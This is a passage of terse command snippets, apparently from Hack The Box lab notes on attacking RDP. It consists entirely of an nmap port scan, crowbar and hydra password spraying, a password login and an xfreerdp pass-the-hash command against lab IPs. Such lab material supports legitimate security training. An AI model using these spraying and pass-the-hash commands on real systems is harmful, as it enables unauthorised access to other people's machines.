...
```shell-session
0xxNosystemisSafe@htb[/htb]# nmap -Pn -p3389 192.168.2.143 
...
```shell-session
0xxNosystemisSafe@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
...
```shell-session
0xxNosystemisSafe@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
...
```shell-session
0xxNosystemisSafe@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143
...
```shell-session
0xxNosystemisSafe@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
